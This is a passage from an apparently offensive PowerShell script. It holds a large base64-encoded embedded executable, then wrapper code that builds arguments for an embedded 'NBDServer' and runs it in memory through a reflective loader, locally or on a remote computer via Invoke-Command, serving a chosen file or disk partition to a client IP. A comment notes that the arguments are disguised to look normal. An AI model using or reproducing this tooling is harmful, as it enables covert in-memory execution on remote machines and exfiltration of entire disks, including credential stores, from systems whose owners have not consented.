AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAQAYAAAAGAAAgAAAAAAAAAAABAAAAAAAAQABAAAAMAAAgAAAAAAAAAAABAAAAAAAAQAJBAAASAAAAFjQAABaAQAA5AQAAAAAAAA8YXNzZW1ibHkgeG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYxIiBtYW5pZmVzdFZlcnNpb249IjEuMCI+DQogIDx0cnVzdEluZm8geG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYzIj4NCiAgICA8c2VjdXJpdHk+DQogICAgICA8cmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICAgICAgPHJlcXVlc3RlZEV4ZWN1dGlvbkxldmVsIGxldmVsPSJhc0ludm9rZXIiIHVpQWNjZXNzPSJmYWxzZSI+PC9yZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbD4NCiAgICAgIDwvcmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICA8L3NlY3VyaXR5Pg0KICA8L3RydXN0SW5mbz4NCjwvYXNzZW1ibHk+UEFQQURESU5HWFhQQURESU5HUEFERElOR1hYUEFERElOR1BBRERJTkdYWFBBRERJTkdQQURESU5HWFhQQURESU5HUEFERElOR1hYUEFEAHAAACQAAACApIikkKSYpLCkuKTQpNik4KTopOCv6K/wrwAAAIAAADAAAAAAoAigEKAYoCCgKKAwoDigQKBIoFCgWKBgoGigcKB4oICgiKCYoKCgALAAACQAAAAAoECgkKDYoAChKKFwocChEKJgoqiiCKMQozijAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="

    #Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
    $ExeArgs = "NBDServer"

    if($ClientIP -and ($ClientIP -ne "")) {
        $ExeArgs += " -c $ClientIP"
    }
    if($ListenPort -and ($ListenPort -ne "")) {
        $ExeArgs += " -p $ListenPort"
    }
    if($FileToServe -and ($FileToServe -ne "")) {
        $ExeArgs += " -f $FileToServe"
    }
    if($PartitionToServe -and ($PartitionToServe -ne "")) {
        $ExeArgs += " -n $PartitionToServe"
    }
    if($ConnectionLimit -and ($ConnectionLimit -ne "")) {
        $ExeArgs += " -l $ConnectionLimit"
    }

    [System.IO.Directory]::SetCurrentDirectory($pwd)

    if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs)
    }
    else
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs) -ComputerName $ComputerName
    }
}

Main
}
